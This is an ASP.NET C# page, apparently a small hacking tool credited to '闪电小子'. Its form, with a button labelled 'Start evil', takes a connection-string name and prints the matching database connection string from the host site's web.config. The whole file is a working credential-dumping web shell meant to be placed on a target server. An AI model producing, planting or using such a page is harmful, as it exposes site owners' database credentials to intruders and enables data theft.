<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">

    protected void btnStart_Click(object sender, EventArgs e)
    {
        string passStr = txtPass.Text.Trim();
        if (passStr.Length == 0)
        {
            Page.ClientScript.RegisterStartupScript(this.GetType(), "", "alert('请先填写密钥信息！')", true);
            return;
        }

        string connStr = "错误喔！";
        try
        {
            connStr = ConfigurationManager.ConnectionStrings[passStr].ConnectionString;
        }
        catch (Exception ex)
        {
            Console.Write(ex);
            Page.ClientScript.RegisterStartupScript(this.GetType(), "", "alert('密钥信息不正确！')", true);

        }

        txtMsg.Text = connStr;
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
       <title>获取web.config连接字符串信息 By：闪电小子</title>
    
    <style type="text/css">
        BODY {
	BACKGROUND: url(main_bg_tall.png) #ffffff repeat-x; FONT: 12px/140% Verdana, Tahoma, sans-serif; COLOR: #666
}
        A {
	    COLOR: #000; TEXT-DECORATION: none
    }
    A:hover {
	    COLOR: #43a707; TEXT-DECORATION: none
    }
    
    .TDHref {
	FONT: 12px/160% Verdana, Tahoma, sans-serif; COLOR: #000
}
    </style>
</head>
<body>
    <form id="form1" runat="server">
    <div>
    <table align="center">
         <tr>
        <td>请填写连接密钥：
        <asp:TextBox ID="txtPass" runat="server"></asp:TextBox>
        <asp:Button ID="btnStart" runat="server" Text="开始邪恶" onclick="btnStart_Click" /></td>
        </tr>
        <tr>
        <td>   连接字符串信息：
        <asp:TextBox ID="txtMsg" runat="server" Width="293px"></asp:TextBox></td>
        </tr>
        <tr>        
        <td align="center" class="TDHref">
        
         From：<a href="http://WwW.KuBiYu.CoM">酷比鱼</a> &nbsp;&nbsp;&nbsp;By: <a href="http://hi.baidu.com/闪电小子_tysan">闪电小子</a> 
        </td>
        </tr>
       
        </table>
    </div>
    </form>
</body>
</html>
